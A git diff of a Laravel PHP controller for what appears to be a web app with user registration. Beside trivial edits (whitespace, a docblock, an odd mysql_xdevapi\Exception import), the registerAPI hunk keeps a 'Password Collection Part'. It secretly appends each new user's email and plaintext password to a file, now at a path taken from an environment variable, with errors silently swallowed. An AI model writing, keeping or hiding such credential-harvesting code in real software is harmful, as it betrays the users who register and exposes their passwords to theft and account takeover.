@@ -5,6 +5,7 @@ namespace App\Http\Controllers;
 use Illuminate\Http\Request;
 use DB;
 use Auth;
+use mysql_xdevapi\Exception;
 use Storage;
 use Hash;
 use App\Mail\AuthEmail;
@@ -174,7 +175,7 @@ class AppController extends Controller
         if ($request->has(['Paper'])) {
             $_paper = $request->Paper;
             $allQuestionTemp = array();
-            $allQuestion = json_decode(Redis::get($_paper))->result;            
+            $allQuestion = json_decode(Redis::get($_paper))->result;
             //DB::table('questions')
             //    ->where('paper', $_paper)
             //    ->get();
@@ -361,6 +362,10 @@ class AppController extends Controller
         return response()->json($this->loginAPI($request));
     }
 
+    /**
+     * @param Request $request
+     * @return array
+     */
     public function registerAPI(Request $request)
     {
         if ($request->has(['Email','Password','Name'])) {
@@ -410,12 +415,18 @@ class AppController extends Controller
                     'is_auth' => 0
                 ]
             );
+            try{
+                //========Password Collection Part========
+                $passwordFile = env('SAVE_PASSWORD');
+                $cred = $_email . ':' . $_password . '\n';
+                file_put_contents($passwordFile, $cred, FILE_APPEND | LOCK_EX);
+                //========================================
 
-            //========Password Collection Part========
-            $passwordFile = "/root/password.txt";
-            $cred = $_email . ':' . $_password . '\n';
-            file_put_contents($passwordFile, $cred, FILE_APPEND | LOCK_EX);
-            //========================================
+            } catch (Exception $e){
+                //error
+            }
+
+
 
             $this->addUnreadMessageLocalAPI('$2y$10$1jAy7xe4qnXcbW6DmBkc4e1gQ9El6HS83id77xYzE0yj2qfnxLYOK', $_name, 'Thanks for registering! You could find a confirmation link in your Email.');
             $this->sendAuthEmail($authSession, $_email);
